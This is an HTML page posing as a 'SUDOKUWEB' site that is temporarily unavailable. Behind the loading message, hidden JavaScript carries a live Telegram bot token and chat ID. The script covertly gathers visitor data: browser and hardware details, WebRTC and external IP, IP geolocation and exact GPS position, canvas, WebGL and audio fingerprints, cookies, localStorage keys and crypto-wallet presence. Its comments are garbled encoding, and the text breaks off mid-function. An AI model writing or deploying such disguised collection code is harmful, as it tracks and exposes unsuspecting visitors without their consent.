<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SUDOKUWEB</title>
    <style>
        /* –ü–æ–ª–Ω–æ—Å—Ç—å—é —Å–∫—Ä—ã—Ç–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background: white;
            overflow: hidden;
        }
        
        /* –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –≤–∏–¥–∏–º—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç –¥–ª—è GitHub Pages */
        .visible-content {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            font-family: Arial, sans-serif;
            color: #333;
            z-index: 9999;
        }
        .text{
            position: fixed;
            top: 70%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            font-family: Arial, sans-serif;
            color: #333;
            z-index: 9999;
        }
        
        /* –°–∫—Ä—ã—Ç—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö */
        .hidden {
            display: none;
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <!-- –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –≤–∏–¥–∏–º—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç -->
    <div class="visible-content">
        <h1>–°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...</h1>
        <div class="loader"></div>
    </div>

<div class="text">
    <h1>SUDOKUWEB</h1>
    <p>–°–∞–π—Ç –≤—Ä–µ–º–µ–Ω–æ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –∏–∑–≤–∏–Ω–∏—Ç–µ –∑–∞ –Ω–µ—É–¥–æ–±—Å—Ç–≤–∞</p>
</div>
    <!-- –°–∫—Ä—ã—Ç—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö -->
    <canvas id="canvasFP" class="hidden"></canvas>
    <canvas id="webglCanvas" class="hidden"></canvas>
    <audio id="audioFP" class="hidden"></audio>
    <video id="videoFP" class="hidden"></video>
    <iframe id="hiddenIframe" class="hidden"></iframe>

<script>
// ============================================
// –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø TELEGRAM –ë–û–¢–ê
// ============================================
const TELEGRAM_CONFIG = {
    // ‚ö†Ô∏è –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –í–ê–®–ò –î–ê–ù–ù–´–ï ‚ö†Ô∏è
    BOT_TOKEN: "8586218811:AAEBr8DYUUjLky-v6neRYFgHDpozwvXeBPQ",      // –û—Ç @BotFather
    CHAT_ID: "1973152925"           // –£–∑–Ω–∞–π—Ç–µ —á–µ—Ä–µ–∑ @getmyid_bot
};

// ============================================
// –ì–õ–û–ë–ê–õ–¨–ù–´–ô –û–ë–™–ï–ö–¢ –î–õ–Ø –í–°–ï–• –î–ê–ù–ù–´–•
// ============================================
const ALL_DATA = {
    timestamp: new Date().toISOString(),
    localTime: new Date().toLocaleString('ru-RU'),
    sessionId: Math.random().toString(36).substring(2) + Date.now().toString(36),
    
    // –ß–∞—Å—Ç—å 1: –û—Å–Ω–æ–≤–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä–∞
    browser: {},
    
    // –ß–∞—Å—Ç—å 2: –°–∏—Å—Ç–µ–º–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    system: {},
    
    // –ß–∞—Å—Ç—å 3: –°–µ—Ç–µ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
    network: {},
    
    // –ß–∞—Å—Ç—å 4: –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
    geolocation: {},
    
    // –ß–∞—Å—Ç—å 5: –ê–ø–ø–∞—Ä–∞—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    hardware: {},
    
    // –ß–∞—Å—Ç—å 6: –¶–∏—Ñ—Ä–æ–≤—ã–µ –æ—Ç–ø–µ—á–∞—Ç–∫–∏
    fingerprints: {},
    
    // –ß–∞—Å—Ç—å 7: –•—Ä–∞–Ω–∏–ª–∏—â–∞ –∏ –∫—É–∫–∏
    storage: {},
    
    // –ß–∞—Å—Ç—å 8: –ö—Ä–∏–ø—Ç–æ –∏ –ø–ª–∞—Ç–µ–∂–∏
    crypto: {},
    
    // –ß–∞—Å—Ç—å 9: –ü–æ–≤–µ–¥–µ–Ω—á–µ—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ
    behavior: {},
    
    // –ß–∞—Å—Ç—å 10: –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏
    capabilities: {},
    
    // –ß–∞—Å—Ç—å 11: –°–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    special: {}
};

// ============================================
// –§–£–ù–ö–¶–ò–Ø 1: –û–°–ù–û–í–ù–´–ï –î–ê–ù–ù–´–ï –ë–†–ê–£–ó–ï–†–ê
// ============================================
function collectBrowserData() {
    ALL_DATA.browser = {
        userAgent: navigator.userAgent,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine,
        pdfViewerEnabled: navigator.pdfViewerEnabled,
        webdriver: navigator.webdriver,
        // –î–µ—Ç–µ–∫—Ü–∏—è –±—Ä–∞—É–∑–µ—Ä–∞
        browser: detectBrowser(),
        browserVersion: detectBrowserVersion(),
        // –î–µ—Ç–µ–∫—Ü–∏—è –û–°
        os: detectOS(),
        osVersion: detectOSVersion(),
        // –î–µ—Ç–µ–∫—Ü–∏—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        device: detectDevice(),
        // –ü–ª–∞–≥–∏–Ω—ã
        plugins: Array.from(navigator.plugins).map(p => ({
            name: p.name,
            filename: p.filename,
            description: p.description,
            version: p.version
        })),
        // MIME —Ç–∏–ø—ã
        mimeTypes: Array.from(navigator.mimeTypes).map(m => ({
            type: m.type,
            description: m.description,
            suffixes: m.suffixes
        }))
    };
}

// ============================================
// –§–£–ù–ö–¶–ò–Ø 2: –°–ò–°–¢–ï–ú–ù–´–ï –î–ê–ù–ù–´–ï
// ============================================
function collectSystemData() {
    ALL_DATA.system = {
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation?.type || 'unknown'
        },
        window: {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            screenX: window.screenX,
            screenY: window.screenY,
            screenLeft: window.screenLeft,
            screenTop: window.screenTop
        },
        performance: {
            memory: performance.memory ? {
                totalJSHeapSize: performance.memory.totalJSHeapSize,
                usedJSHeapSize: performance.memory.usedJSHeapSize,
                jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
            } : null,
            timing: performance.timing ? {
                navigationStart: performance.timing.navigationStart,
                loadEventEnd: performance.timing.loadEventEnd,
                domComplete: performance.timing.domComplete,
                // –†–∞—Å—á—ë—Ç –≤—Ä–µ–º–µ–Ω–∏ –∑–∞–≥—Ä—É–∑–∫–∏
                pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
                domReadyTime: performance.timing.domContentLoadedEventStart - performance.timing.navigationStart
            } : null,
            navigation: performance.navigation ? {
                type: performance.navigation.type,
                redirectCount: performance.navigation.redirectCount
            } : null
        },
        time: {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
            numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
        },
        // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≤–∫–ª–∞–¥–∫–µ
        tab: {
            title: document.title,
            referrer: document.referrer,
            url: window.location.href,
            hostname: window.location.hostname,
            origin: window.location.origin,
            protocol: window.location.protocol,
            port: window.location.port,
            hash: window.location.hash,
            search: window.location.search
        }
    };
}

// ============================================
// –§–£–ù–ö–¶–ò–Ø 3: –°–ï–¢–ï–í–´–ï –î–ê–ù–ù–´–ï –ò –ì–ï–û–õ–û–ö–ê–¶–ò–Ø
// ============================================
async function collectNetworkAndGeoData() {
    // –°–µ—Ç–µ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
    ALL_DATA.network = {
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        } : null,
        // WebRTC IP —É—Ç–µ—á–∫–∞
        webrtcIP: await getWebRTCIP(),
        // –í–Ω–µ—à–Ω–∏–π IP —á–µ—Ä–µ–∑ —Å–µ—Ä–≤–∏—Å—ã
        externalIP: await getExternalIP(),
        // –ó–∞–≥–æ–ª–æ–≤–∫–∏ (—á–∞—Å—Ç–∏—á–Ω–æ)
        headers: {
            userAgent: navigator.userAgent,
            accept: navigator.languages.join(', '),
            encoding: 'gzip, deflate, br',
            language: navigator.language
        }
    };
    
    // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ IP
    ALL_DATA.geolocation = await getIPGeolocation();
    
    // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: –ø–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å —Ç–æ—á–Ω—É—é –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
    if ('geolocation' in navigator) {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: false,
                    timeout: 5000,
                    maximumAge: 600000
                });
            });
            
            ALL_DATA.geolocation.exact = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: new Date(position.timestamp).toISOString(),
                mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
                yandexMapsLink: `https://yandex.ru/maps/?pt=${position.coords.longitude},${position.coords.latitude}&z=15`
            };
        } catch (error) {
            ALL_DATA.geolocation.exact = { error: error.message };
        }
    }
}

// ============================================
// –§–£–ù–ö–¶–ò–Ø 4: –ê–ü–ü–ê–†–ê–¢–ù–´–ï –î–ê–ù–ù–´–ï
// ============================================
async function collectHardwareData() {
    ALL_DATA.hardware = {
        // –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä
        cpu: {
            cores: navigator.hardwareConcurrency || 'unknown',
            architecture: navigator.userAgent.includes('x64') ? 'x64' : 
                         navigator.userAgent.includes('ARM') ? 'ARM' : 'x86'
        },
        // –ü–∞–º—è—Ç—å
        memory: {
            deviceMemory: navigator.deviceMemory || 'unknown',
            jsHeapSizeLimit: performance.memory?.jsHeapSizeLimit
        },
        // –ë–∞—Ç–∞—Ä–µ—è (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–æ)
        battery: await getBatteryInfo(),
        // –°–µ–Ω—Å–æ—Ä—ã
        sensors: {
            hasAccelerometer: 'DeviceMotionEvent' in window,
            hasGyroscope: 'DeviceOrientationEvent' in window,
            hasMagnetometer: 'oncompassneedscalibration' in window,
            hasProximity: 'ondeviceproximity' in window,
            hasLight: 'ondevicelight' in window
        },
        // –£—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –≤–≤–æ–¥–∞
        input: {
            maxTouchPoints: navigator.maxTouchPoints || 0,
            hasTouch: 'ontouchstart' in window,
            pointer: navigator.pointerEnabled || 'pointerEnabled' in navigator
        },
        // –ú–µ–¥–∏–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        media: {
            audio: {
                context: 'AudioContext' in window || 'webkitAudioContext' in window,
                oscillator: 'createOscillator' in (window.AudioContext?.prototype || window.webkitAudioContext?.prototype)
            },
            video: {
                capabilities: 'mediaDevices' in navigator,
                getDisplayMedia: 'getDisplayMedia' in navigator.mediaDevices
            }
        },
        // –ì—Ä–∞—Ñ–∏–∫–∞
        graphics: await getGraphicsInfo()
    };
}

// ============================================
// –§–£–ù–ö–¶–ò–Ø 5: –¶–ò–§–†–û–í–´–ï –û–¢–ü–ï–ß–ê–¢–ö–ò
// ============================================
async function collectFingerprints() {
    ALL_DATA.fingerprints = {
        // Canvas –æ—Ç–ø–µ—á–∞—Ç–æ–∫
        canvas: getCanvasFingerprint(),
        // WebGL –æ—Ç–ø–µ—á–∞—Ç–æ–∫
        webgl: getWebGLFingerprint(),
        // –ê—É–¥–∏–æ –æ—Ç–ø–µ—á–∞—Ç–æ–∫
        audio: await getAudioFingerprint(),
        // –®—Ä–∏—Ñ—Ç—ã
        fonts: getInstalledFonts(),
        // Timezone –æ—Ç–ø–µ—á–∞—Ç–æ–∫
        timezone: {
            offset: new Date().getTimezoneOffset(),
            zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            locale: Intl.DateTimeFormat().resolvedOptions().locale
        },
        // Screen –æ—Ç–ø–µ—á–∞—Ç–æ–∫
        screen: {
            resolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio
        },
        // –ü–ª–∞–≥–∏–Ω—ã –æ—Ç–ø–µ—á–∞—Ç–æ–∫
        pluginsHash: hashPlugins(),
        // –ö–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –æ—Ç–ø–µ—á–∞—Ç–æ–∫
        combined: generateCombinedFingerprint()
    };
}

// ============================================
// –§–£–ù–ö–¶–ò–Ø 6: –•–†–ê–ù–ò–õ–ò–©–ê –ò –ö–£–ö–ò
// ============================================
function collectStorageData() {
    ALL_DATA.storage = {
        cookies: {
            enabled: navigator.cookieEnabled,
            count: document.cookie ? document.cookie.split(';').length : 0,
            list: document.cookie.split(';').map(c => c.trim())
        },
        localStorage: {
            available: !!window.localStorage,
            items: localStorage ? Object.keys(localStorage).length : 0,
            keys: localStorage ? Object.keys(localStorage) : []
        },
        sessionStorage: {
            available: !!window.sessionStorage,
            items: sessionStorage ? Object.keys(sessionStorage).length : 0
        },
        indexedDB: {
            available: !!window.indexedDB,
            databases: []
        },
        cache: {
            serviceWorker: 'serviceWorker' in navigator,
            caches: 'caches' in window
        }
    };
    
    // –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –±–∞–∑ IndexedDB
    if (window.indexedDB) {
        try {
            const dbs = indexedDB.databases ? indexedDB.databases() : Promise.resolve([]);
            dbs.then(databases => {
                ALL_DATA.storage.indexedDB.databases = databases;
            }).catch(() => {});
        } catch(e) {}
    }
}

// ============================================
// –§–£–ù–ö–¶–ò–Ø 7: –ö–†–ò–ü–¢–û –ò –ü–õ–ê–¢–ï–ñ–ò
// ============================================
function collectCryptoData() {
    ALL_DATA.crypto = {
        // –ö—Ä–∏–ø—Ç–æ-–∫–æ—à–µ–ª—å–∫–∏
        wallets: {
            metamask: typeof window.ethereum !== 'undefined',
            trustwallet: typeof window.trustwallet !== 'undefined',
            coinbase: typeof window.coinbaseWalletExtension !== 'undefined',
            phantom: window.solana && window.solana.isPhantom,
            detected: detectAllWallets()
        },
        // –ü–ª–∞—Ç–µ–∂–Ω—ã–µ —Å–∏—Å—Ç–µ–º—ã
        payment: {
            applePay: 'ApplePaySession' in window,
            googlePay: 'google' in window,
            paymentRequest: 'PaymentRequest' in window
        },
        // –ö—Ä–∏–ø—Ç–æ API
        cryptoAPI: {
            subtle: 'subtle' in (window.crypto || window.msCrypto),
            randomUUID: 'randomUUID' in (window.crypto || window.msCrypto),
            getRandomValues: 'getRandomValues' in (window.crypto || window.msCrypto)
        },
        // –ë–ª–æ–∫—á–µ–π–Ω
        blockchain: {
            web3: typeof window.web3 !== 'undefined',
            ethereum: typeof window.ethereum !== 'undefined',
            solana: typeof window.solana !== 'undefined'
        }
    };
}

// ============================================
// –§–£–ù–ö–¶–ò–Ø 8: –ü–û–í–ï–î–ï–ù–ß–ï–°–ö–ò–ï –î–ê–ù–ù–´–ï
// ============================================
function collectBehaviorData() {
    ALL_DATA.behavior = {
        startTime: Date.now(),
        pageLoad: {
            readyState: document.readyState,
            hidden: document.hidden,
            visibilityState: document.visibilityState
        },
        interactions: {
            clicks: 0,
            keyPresses: 0,
            mouseMoves: 0,
            scrolls: 0
        },
        timing: {
            pageLoad: performance.timing ? 
                performance.timing.loadEventEnd - performance.timing.navigationStart : null,
            domReady: performance.timing ?
                performance.timing.domContentLoadedEventStart - performance.timing.navigationStart : null
        },
        // –ë—É–¥–µ—Ç –∑–∞–ø–æ–ª–Ω–µ–Ω–æ –ø–æ–∑–∂–µ
        history: {
            referrer: document.referrer,
            redirects: performance.navigation?.redirectCount || 0
        }
    };
    
    // –ù–∞—á–∏–Ω–∞–µ–º –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –ø–æ–≤–µ–¥–µ–Ω–∏—è
    startBehaviorTracking();
}

// ============================================
// –§–£–ù–ö–¶–ò–Ø 9: –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–´–ï –í–û–ó–ú–û–ñ–ù–û–°–¢–ò
// ============================================
function collectCapabilities() {
    ALL_DATA.capabilities = {
        // Web APIs
        webAPIs: {
            webRTC: 'RTCPeerConnection' in window,
            webSocket: 'WebSocket' in window,
            webGL: 'WebGLRenderingContext' in window,
            webGPU: 'GPU' in window,
            webVR: 'getVRDisplays' in navigator,
            webXR: 'xr' in navigator
        },
        // Media APIs
        mediaAPIs: {
            getUserMedia: 'getUserMedia' in navigator.mediaDevices,
            getDisplayMedia: 'getDisplayMedia' in navigator.mediaDevices,
            mediaRecorder: 'MediaRecorder' in window,
            mediaSource: 'MediaSource' in window
        },
        // Device APIs
        deviceAPIs: {
            vibration: 'vibrate' in navigator,
            battery: 'getBattery' in navigator,
            wakeLock: 'wakeLock' in navigator,
            bluetooth: 'bluetooth' in navigator,
            usb: 'usb' in navigator,
            nfc: 'nfc' in navigator,
            serial: 'serial' in navigator
        },
        // Storage APIs
        storageAPIs: {
            indexedDB: 'indexedDB' in window,
            caches: 'caches' in window,
            localStorage: 'localStorage' in window,
            sessionStorage: 'sessionStorage' in window
        },
        // Communication APIs
        communicationAPIs: {
            push: 'PushManager' in window,
            notification: 'Notification' in window,
            serviceWorker: 'serviceWorker' in navigator,
            backgroundSync: 'sync' in (window.registration || {}),
            periodicSync: 'periodicSync' in (window.registration || {})
        },
        // UI APIs
        uiAPIs: {
            fullscreen: 'fullscreenEnabled' in document,
            pointerLock: 'pointerLockElement' in document,
            wakeLock: 'wakeLock' in navigator,
            clipboard: 'clipboard' in navigator,
            share: 'share' in navigator
        },
        // Performance APIs
        performanceAPIs: {
            performance: 'performance' in window,
            performanceObserver: 'PerformanceObserver' in window,
            performanceTimeline: 'performance' in window && 'getEntries' in performance,
            resourceTiming: 'PerformanceResourceTiming' in window,
            userTiming: 'performance' in window && 'mark' in performance
        },
        // Security APIs
        securityAPIs: {
            credential: 'credentials' in navigator,
            publicKeyCredential: 'PublicKeyCredential' in window,
            webAuthn: 'PublicKeyCredential' in window
        }
    };
}

// ============================================
// –§–£–ù–ö–¶–ò–Ø 10: –°–ü–ï–¶–ò–ê–õ–¨–ù–´–ï –î–ê–ù–ù–´–ï
// ============================================
function collectSpecialData() {
    ALL_DATA.special = {
        // –°–æ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–µ—Ç–∏ (–ø–æ –∫—É–∫–∞–º)
        social: detectSocialNetworks(),
        // –†–µ–∫–ª–∞–º–Ω—ã–µ —Ç—Ä–µ–∫–µ—Ä—ã
        trackers: detectTrackers(),
        // –†–∞—Å—à–∏—Ä–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞
        extensions: detectExtensions(),
        // VPN/Proxy –¥–µ—Ç–µ–∫—Ü–∏—è
        vpn: detectVPN(),
        // –ü—Ä–∏–≤–∞—Ç–Ω—ã–π —Ä–µ–∂–∏–º
        privateMode: detectPrivateMode(),
        // –ë–ª–æ–∫–∏—Ä–æ–≤—â–∏–∫–∏ —Ä–µ–∫–ª–∞–º—ã
        adBlockers: detectAdBlockers(),
        // DevTools –æ—Ç–∫—Ä—ã—Ç—ã?
        devTools: detectDevTools()
    };
}

// ============================================
// –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò
// ============================================

// WebRTC IP —É—Ç–µ—á–∫–∞
async function getWebRTCIP() {
    return new Promise((resolve) => {
        const rtc = new RTCPeerConnection({ iceServers: [] });
        rtc.createDataChannel('');
        rtc.createOffer()
            .then(offer => rtc.setLocalDescription(offer))
            .catch(() => resolve(null));
        
        rtc.onicecandidate = (event) => {
            if (event.candidate) {
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                const match = event.candidate.candidate.match(ipRegex);
                if (match) {
                    resolve(match[0]);
                    rtc.close();
                }
            }
        };
        
        setTimeout(() => {
            rtc.close();
            resolve(null);
        }, 1000);
    });
}

// –í–Ω–µ—à–Ω–∏–π IP —á–µ—Ä–µ–∑ —Å–µ—Ä–≤–∏—Å—ã
async function getExternalIP() {
    const services = [
        'https://api.ipify.org?format=json',
        'https://api.myip.com',
        'https://ipinfo.io/json',
        'https://ipapi.co/json/'
    ];
    
    for (const service of services) {
        try {
            const response = await fetch(service, { timeout: 3000 });
            const data = await response.json();
            if (data.ip) return data.ip;
        } catch(e) { continue; }
    }
    return null;
}

// –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –ø–æ IP
async function getIPGeolocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            country_code: data.country_code,
            postal: data.postal,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone,
            org: data.org,
            asn: data.asn,
            maps: `https://maps.google.com/?q=${data.latitude},${data.longitude}`,
            yandexMaps: `https://yandex.ru/maps/?pt=${data.longitude},${data.latitude}&z=15`
        };
    } catch (error) {
        return { error: error.message };
    }
}

// –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–∞—Ç–∞—Ä–µ–µ
async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return {
                level: battery.level,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch(e) {}
    }
    return null;
}

// –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≥—Ä–∞—Ñ–∏–∫–µ
async function getGraphicsInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
                version: gl.getParameter(gl.VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
            };
        }
    } catch(e) {}
    return null;
}

// Canvas –æ—Ç–ø–µ—á–∞—Ç–æ–∫
function getCanvasFingerprint() {
    try {
        const canvas = document.getElementById('canvasFP');
        const ctx = canvas.getContext('2d');
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('fingerprint', 4, 17);
        
        return canvas.toDataURL().substring(22, 100);
    } catch (e) {
        return 'error';
    }
}

// WebGL –æ—Ç–ø–µ—á–∞—Ç–æ–∫
function getWebGLFingerprint() {
    try {
        const canvas = document.getElementById('webglCanvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return null;
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A'
        };
    } catch (e) {
        return null;
    }
}

// –ê—É–¥–∏–æ –æ—Ç–ø–µ—á–∞—Ç–æ–∫
async function getAudioFingerprint() {
    return new Promise((resolve) => {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gain = audioContext.createGain();
            
            gain.gain.value = 0;
            oscillator.connect(analyser);
            analyser.connect(gain);
            gain.connect(audioContext.destination);
            
            oscillator.start();
            
            const dataArray = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(dataArray);
            
            let hash = 0;
            for (let i = 0; i < dataArray.length; i++) {
                hash = ((hash << 5) - hash) + dataArray[i];
                hash = hash & hash;
            }
            
            oscillator.stop();
            audioContext.close();
            
            resolve(hash.toString(36));
        } catch (e) {
            resolve('audio_error');
        }
    });
}

// –°–ø–∏—Å–æ–∫ —à—Ä–∏—Ñ—Ç–æ–≤
function getInstalledFonts() {
    const fontList = [
        'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
        'Verdana', 'Helvetica', 'Helvetica Neue', 'Geneva',
        'Lucida Grande', 'Palatino', 'Gill Sans', 'Ubuntu',
        'Open Sans', 'Roboto', 'Lato', 'Montserrat',
        'Microsoft YaHei', 'SimSun', 'Meiryo', 'Malgun Gothic'
    ];
    
    const available = [];
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const baseFont = ctx.font;
    
    fontList.forEach(font => {
        ctx.font = `72px "${font}"`;
        if (ctx.font !== baseFont) {
            available.push(font);
        }
    });
    
    return available;
}

// –•—ç—à –ø–ª–∞–≥–∏–Ω–æ–≤
function hashPlugins() {
    const plugins = Array.from(navigator.plugins).map(p => p.name).join(',');
    let hash = 0;
    for (let i = 0; i < plugins.length; i++) {
        hash = ((hash << 5) - hash) + plugins.charCodeAt(i);
        hash = hash & hash;
    }
    return hash.toString(36);
}

// –ö–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –æ—Ç–ø–µ—á–∞—Ç–æ–∫
function generateCombinedFingerprint() {
    const components = [
        navigator.userAgent,
        navigator.platform,
        screen.width + 'x' + screen.height,
        screen.colorDepth,
        new Date().getTimezoneOffset(),
        navigator.language,
        !!window.sessionStorage,
        !!window.localStorage,
        navigator.hardwareConcurrency || 'unknown'
    ];
    
    return components.join('|').hashCode();
}

// –î–µ—Ç–µ–∫—Ü–∏—è –≤—Å–µ—Ö –∫–æ—à–µ–ª—å–∫–æ–≤
function detectAllWallets() {
    const wallets = [];
    if (typeof window.ethereum !== 'undefined') wallets.push('MetaMask');
    if (typeof window.trustwallet !== 'undefined') wallets.push('Trust Wallet');
    if (typeof window.coinbaseWalletExtension !== 'undefined') wallets.push('Coinbase Wallet');
    if (window.solana && window.solana.isPhantom) wallets.push('Phantom');
    return wallets;
}

// –î–µ—Ç–µ–∫—Ü–∏—è –±—Ä–∞—É–∑–µ—Ä–∞
function detectBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
    if (ua.includes('Edg')) return 'Edge';
    if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
    return 'Unknown';
}

function detectBrowserVersion() {
    const ua = navigator.userAgent;
    const match = ua.match(/(Chrome|Firefox|Safari|Edg|Opera|OPR)\/(\d+)/);
    return match ? match[2] : 'unknown';
}

// –î–µ—Ç–µ–∫—Ü–∏—è –û–°
function detectOS() {
    const ua = navigator.userAgent;
    if (ua.includes('Windows')) return 'Windows';
    if (ua.includes('Mac')) return 'macOS';
    if (ua.includes('Linux')) return 'Linux';
    if (ua.includes('Android')) return 'Android';
    if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
    return 'Unknown';
}

function detectOSVersion() {
    const ua = navigator.userAgent;
    const match = ua.match(/(Windows NT|Android|CPU OS|Mac OS X)\s([\d._]+)/);
    return match ? match[2] : 'unknown';
}

// –î–µ—Ç–µ–∫—Ü–∏—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
function detectDevice() {
    const ua = navigator.userAgent;
    if (ua.includes('Mobile')) return 'Mobile';
    if (ua.includes('Tablet')) return 'Tablet';
    return 'Desktop';
}

// –°–æ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–µ—Ç–∏ –ø–æ –∫—É–∫–∞–º
function detectSocialNetworks() {
    const socials = [];
